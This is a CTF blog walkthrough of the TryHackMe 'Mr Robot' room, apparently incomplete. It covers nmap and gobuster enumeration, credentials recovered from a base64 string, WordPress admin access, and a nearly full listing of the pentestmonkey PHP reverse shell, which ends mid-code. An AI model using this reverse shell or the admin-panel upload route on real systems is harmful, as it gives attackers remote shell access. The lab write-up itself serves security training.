<!DOCTYPE html>
<html lang="en-US">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
<link rel="manifest" href="/site.webmanifest" />
<title>Mr Robot CTF | crazyc4t&#39;s blog</title>
<meta name="title" content="Mr Robot CTF" />
<meta name="description" content="Walkthrough of the Mr Robot box in Try Hack Me." />
<meta name="keywords" content="Try Hack Me,Linux Priv Escalation," />






  
  <meta property="og:url" content="http://localhost:1313/blog/mrrobot/">
  <meta property="og:site_name" content="crazyc4t&#39;s blog">
  <meta property="og:title" content="Mr Robot CTF">
  <meta property="og:description" content="Walkthrough of the Mr Robot box in Try Hack Me.">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2022-11-06T08:42:00-05:00">
    <meta property="article:modified_time" content="2022-11-06T08:42:00-05:00">
    <meta property="article:tag" content="Try Hack Me">
    <meta property="article:tag" content="Linux Priv Escalation">


  
  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Mr Robot CTF">
  <meta name="twitter:description" content="Walkthrough of the Mr Robot box in Try Hack Me.">


  
  
  <meta itemprop="name" content="Mr Robot CTF">
  <meta itemprop="description" content="Walkthrough of the Mr Robot box in Try Hack Me.">
  <meta itemprop="datePublished" content="2022-11-06T08:42:00-05:00">
  <meta itemprop="dateModified" content="2022-11-06T08:42:00-05:00">
  <meta itemprop="wordCount" content="2337">
  <meta itemprop="keywords" content="Try Hack Me,Linux Priv Escalation">

<meta name="referrer" content="no-referrer-when-downgrade" />

  
  <link href="/style.min.css" rel="stylesheet">

  
  <link href="/syntax.min.css" rel="stylesheet">

  

  

<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
<link rel="manifest" href="/site.webmanifest" />
</head>

<body>
  <header><a href="/" class="title"><h1>crazyc4t&#39;s blog</h1></a>
<nav>
<a href="/">Home</a>

<a href="/blog/">Blog</a>
 
<a
  href='mailto:saidneder1@gmail.com?subject=Reply%20to%20"Mr%20Robot%20CTF"'
  >Email</a
>

<a href="https://saidneder.ca" target="_blank">My links</a>
<a href="/index.xml">RSS</a>


 


 


<a class="disabled" role="link" aria-disabled="true">es 🇪🇨</a>
  
</nav>
</header>
  <main> 
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
<link rel="manifest" href="/site.webmanifest" />

<h1>Mr Robot CTF</h1>
<p>
  <i>
    <time datetime='2022-11-06' pubdate>
      2022-11-06
    </time>
  </i>
</p>

<content> <p><img src="/images/mrrobot.png" alt="head"></p>
<p>Welcome to a new machine walkthrough!</p>
<p>Now it&rsquo;s the time for this awesome machine that is the <a href="https://tryhackme.com/room/mrrobot">Mr Robot</a> room in Try Hack Me!</p>
<h2 id="enumeration">Enumeration</h2>
<p>First my own methodology that I&rsquo;m working with is to make Nmap scans, while doing some gobuster&rsquo;s directories discoveries, so let&rsquo;s go step by step.</p>
<h3 id="nmap">Nmap</h3>
<p><code>sudo nmap -sS -Pn -T5 -p- -vvv --open 10.10.112.68 -oG allPorts</code>
<img src="/images/mrrobot1.png" alt="mrrobot1">
With the <code>-vvv</code> triple verbosity flag we know already open ports without the scan being finished, giving us a bit of time to work.</p>
<h3 id="gobuster">Gobuster</h3>
<p><code>gobuster dir --url http://10.10.255.165 -t 40 -w /usr/share/dirb/wordlists/common.txt --no-error --output directories.txt</code></p>
<p>While scanning, let&rsquo;s take a look on the little details, Mr <strong>Robot</strong> hmmm, shouldn&rsquo;t be there some type of <strong>robots.txt</strong>?</p>
<p>Giving the result of http://10.10.32.149/robots.txt:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">User-agent: *
</span></span><span class="line"><span class="ln">2</span><span class="cl">fsocity.dic
</span></span><span class="line"><span class="ln">3</span><span class="cl">key-1-of-3.txt
</span></span></code></pre></div><p>Remember that robots.txt is a file made for making directories of a website not visible by a search engine.</p>
<p>So with that said, we curled those up and we get the first flag!</p>
<p><code>curl http://10.10.32.149/fsociety.dic</code>
<code>curl http://10.10.32.149/key-1-of-3.txt</code></p>
<p>Finishing up with gobuster, we get the results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">/.htaccess            <span class="o">[</span>Size: 218<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">/.hta                 <span class="o">[</span>Size: 213<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">/.htpasswd            <span class="o">[</span>Size: 218<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">/0                    <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/0/<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">/admin                <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/admin/<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">/audio                <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/audio/<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">/atom                 <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/feed/atom/<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">/blog                 <span class="o">[</span>Size: 233<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/blog/<span class="o">]</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">/css                  <span class="o">[</span>Size: 232<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/css/<span class="o">]</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">/dashboard            <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/wp-admin/<span class="o">]</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">/favicon.ico          <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">/feed                 <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/feed/<span class="o">]</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">/images               <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/images/<span class="o">]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">/image                <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/image/<span class="o">]</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">/Image                <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/Image/<span class="o">]</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">/index.html           <span class="o">[</span>Size: 1188<span class="o">]</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">/index.php            <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/<span class="o">]</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">/intro                <span class="o">[</span>Size: 516314<span class="o">]</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">/js                   <span class="o">[</span>Size: 231<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/js/<span class="o">]</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">/license              <span class="o">[</span>Size: 309<span class="o">]</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">/login                <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/wp-login.php<span class="o">]</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">/phpmyadmin           <span class="o">[</span>Size: 94<span class="o">]</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">/readme               <span class="o">[</span>Size: 64<span class="o">]</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">/rdf                  <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/feed/rdf/<span class="o">]</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">/robots.txt           <span class="o">[</span>Size: 41<span class="o">]</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">/robots               <span class="o">[</span>Size: 41<span class="o">]</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">/rss                  <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/feed/<span class="o">]</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">/rss2                 <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/feed/<span class="o">]</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">/sitemap              <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">/sitemap.xml          <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">/video                <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/video/<span class="o">]</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">/wp-admin             <span class="o">[</span>Size: 237<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/wp-admin/<span class="o">]</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">/wp-content           <span class="o">[</span>Size: 239<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/wp-content/<span class="o">]</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">/wp-includes          <span class="o">[</span>Size: 240<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/wp-includes/<span class="o">]</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">/wp-config            <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">/wp-cron              <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">/wp-links-opml        <span class="o">[</span>Size: 227<span class="o">]</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">/wp-load              <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">/wp-login             <span class="o">[</span>Size: 2606<span class="o">]</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">/wp-mail              <span class="o">[</span>Size: 3064<span class="o">]</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">/wp-settings          <span class="o">[</span>Size: 0<span class="o">]</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">/wp-signup            <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.32.149/wp-login.php?action<span class="o">=</span>register<span class="o">]</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">/xmlrpc.php           <span class="o">[</span>Size: 42<span class="o">]</span>
</span></span></code></pre></div><p>And we get tons of directories! we see repeating a lot the<code>wp</code> keyword, and that&rsquo;s because it&rsquo;s a wordpress site! So now we know what is our target, but let&rsquo;s get more knowledge about the directories of the page, since we got a dictionary from the <code>robots.txt</code> file, we can do another gobuster scan:
<code>gobuster dir --url http://10.10.32.149 -t 40 -w fsocity.dic -no-error --output fsocietyScan.txt</code></p>
<p>While that&rsquo;s finishing, let&rsquo;s go into some of this directories, let&rsquo;s go to license:
<img src="/images/mrrobot2.png" alt="mrrobot2"></p>
<p>And we found something funny, with a base 64 attached, who is the script kitty now huh? Let&rsquo;s get to decoding, I like this website for anything related to base64: <a href="https://www.base64decode.org/">https://www.base64decode.org/</a></p>
<p>The result of the decode is: <code>elliot:ER28-0652</code></p>
<p>Giving us a user for the wordpress site, but let&rsquo;s not go to there yet, there&rsquo;s more to discover, so check those directories that gave us the gobuster scan.</p>
<p>Although I was seeing my scan of the <code>fsociety.dic</code> and I didn&rsquo;t knew why it was taking so long, but is because the dictionary is over 800000 WORDS LONG! So no way I&rsquo;m going to scan through the whole dictionary, so I terminated the scan.</p>
<h2 id="getting-in-depth">Getting in-depth</h2>
<p>Let&rsquo;s go to the wordpress admin panel (<code>/wp-admin</code>) and enter the elliot credentials, having acces to the panel!</p>
<p>On the bottom of the page we have the wordpress version, so let&rsquo;s make a quick google about if there&rsquo;s some exploits on that specific version of wordpress (4.3.1)</p>
<p>Giving us as a search result a exploit database link: <a href="https://www.exploit-db.com/exploits/50255">https://www.exploit-db.com/exploits/50255</a> where it says it has a RCE vulnerability (Remote Code Execution) from the wordpress admin panel (which we have access to), but before everything let&rsquo;s poke around the admin panel.
<img src="/images/mrrobot3.png" alt="mrrobot3"></p>
<p>This gives us more information about the users that are available in the wordpress site, now let&rsquo;s get into exploiting.</p>
<h2 id="exploit">Exploit</h2>
<p>As we already know, wordpress is built with PHP, that is a back-end programming language, meaning that handles the server side of things, so we need to find a way to upload a exploit that can give us a reverse shell, and there&rsquo;s a github repo with a php exploit here: <a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></p>
<p>This is the exploit we are going to use:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="c1">// for any actions performed using this tool.  The author accepts no liability
</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then
</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="c1">// do not use this tool.
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="c1">// In all other respects the GPL version 2 applies:
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="c1">// This program is free software; you can redistribute it and/or modify
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="c1">// it under the terms of the GNU General Public License version 2 as
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="c1">// published by the Free Software Foundation.
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="c1">// This program is distributed in the hope that it will be useful,
</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="c1">// but WITHOUT ANY WARRANTY; without even the implied warranty of
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="c1">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="c1">// GNU General Public License for more details.
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="c1">// You should have received a copy of the GNU General Public License along
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="c1">// with this program; if not, write to the Free Software Foundation, Inc.,
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="c1">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
</span></span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="c1">// for any actions performed using this tool.  If these terms are not acceptable to
</span></span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="c1">// you, then do not use this tool.
</span></span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 29</span><span class="cl"><span class="c1">// You are encouraged to send comments, improvements or suggestions to
</span></span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="c1">// me at pentestmonkey@pentestmonkey.net
</span></span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="c1">// Description
</span></span></span><span class="line"><span class="ln"> 33</span><span class="cl"><span class="c1">// -----------
</span></span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="c1">// This script will make an outbound TCP connection to a hardcoded IP and port.
</span></span></span><span class="line"><span class="ln"> 35</span><span class="cl"><span class="c1">// The recipient will be given a shell running as the current user (apache normally).
</span></span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 37</span><span class="cl"><span class="c1">// Limitations
</span></span></span><span class="line"><span class="ln"> 38</span><span class="cl"><span class="c1">// -----------
</span></span></span><span class="line"><span class="ln"> 39</span><span class="cl"><span class="c1">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
</span></span></span><span class="line"><span class="ln"> 40</span><span class="cl"><span class="c1">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
</span></span></span><span class="line"><span class="ln"> 41</span><span class="cl"><span class="c1">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
</span></span></span><span class="line"><span class="ln"> 42</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 43</span><span class="cl"><span class="c1">// Usage
</span></span></span><span class="line"><span class="ln"> 44</span><span class="cl"><span class="c1">// -----
</span></span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
</span></span></span><span class="line"><span class="ln"> 46</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="nx">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 48</span><span class="cl"><span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&#34;1.0&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>  <span class="c1">// CHANGE THIS
</span></span></span><span class="line"><span class="ln"> 50</span><span class="cl"><span class="c1"></span><span class="nv">$port</span> <span class="o">=</span> <span class="mi">443</span><span class="p">;</span>       <span class="c1">// CHANGE THIS
</span></span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="c1"></span><span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl"><span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl"><span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;uname -a; w; id; /bin/sh -i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 56</span><span class="cl"><span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">
</span></span><span class="line"><span class="ln"> 58</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="c1">// Daemonise ourself if possible to avoid zombies later
</span></span></span><span class="line"><span class="ln"> 60</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl"><span class="c1">// pcntl_fork is hardly ever available, but will allow us to daemonise
</span></span></span><span class="line"><span class="ln"> 63</span><span class="cl"><span class="c1">// our php process and avoid zombies.  Worth a try...
</span></span></span><span class="line"><span class="ln"> 64</span><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_fork&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">	<span class="c1">// Fork and have the parent process exit
</span></span></span><span class="line"><span class="ln"> 66</span><span class="cl"><span class="c1"></span>	<span class="nv">$pid</span> <span class="o">=</span> <span class="nx">pcntl_fork</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Can&#39;t fork&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits
</span></span></span><span class="line"><span class="ln"> 75</span><span class="cl"><span class="c1"></span>	<span class="p">}</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">	<span class="c1">// Make the current process a session leader
</span></span></span><span class="line"><span class="ln"> 78</span><span class="cl"><span class="c1"></span>	<span class="c1">// Will only succeed if we forked
</span></span></span><span class="line"><span class="ln"> 79</span><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nx">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">		<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Error: Can&#39;t setsid()&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">	<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">
</span></span><span class="line"><span class="ln"> 89</span><span class="cl"><span class="c1">// Change to a safe directory
</span></span></span><span class="line"><span class="ln"> 90</span><span class="cl"><span class="c1"></span><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">
</span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="c1">// Remove any umask we inherited
</span></span></span><span class="line"><span class="ln"> 93</span><span class="cl"><span class="c1"></span><span class="nx">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">
</span></span><span class="line"><span class="ln"> 95</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 96</span><span class="cl"><span class="c1">// Do the reverse shell...
</span></span></span><span class="line"><span class="ln"> 97</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln"> 98</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl"><span class="c1">// Open reverse connection
</span></span></span><span class="line"><span class="ln">100</span><span class="cl"><span class="c1"></span><span class="nv">$sock</span> <span class="o">=</span> <span class="nx">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">102</span><span class="cl">	<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">
</span></span><span class="line"><span class="ln">106</span><span class="cl"><span class="c1">// Spawn shell process
</span></span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="c1"></span><span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from
</span></span></span><span class="line"><span class="ln">109</span><span class="cl"><span class="c1"></span>   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to
</span></span></span><span class="line"><span class="ln">110</span><span class="cl"><span class="c1"></span>   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to
</span></span></span><span class="line"><span class="ln">111</span><span class="cl"><span class="c1"></span><span class="p">);</span>
</span></span><span class="line"><span class="ln">112</span><span class="cl">
</span></span><span class="line"><span class="ln">113</span><span class="cl"><span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">
</span></span><span class="line"><span class="ln">115</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">116</span><span class="cl">	<span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Can&#39;t spawn shell&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">118</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">
</span></span><span class="line"><span class="ln">120</span><span class="cl"><span class="c1">// Set everything to non-blocking
</span></span></span><span class="line"><span class="ln">121</span><span class="cl"><span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
</span></span></span><span class="line"><span class="ln">122</span><span class="cl"><span class="c1"></span><span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
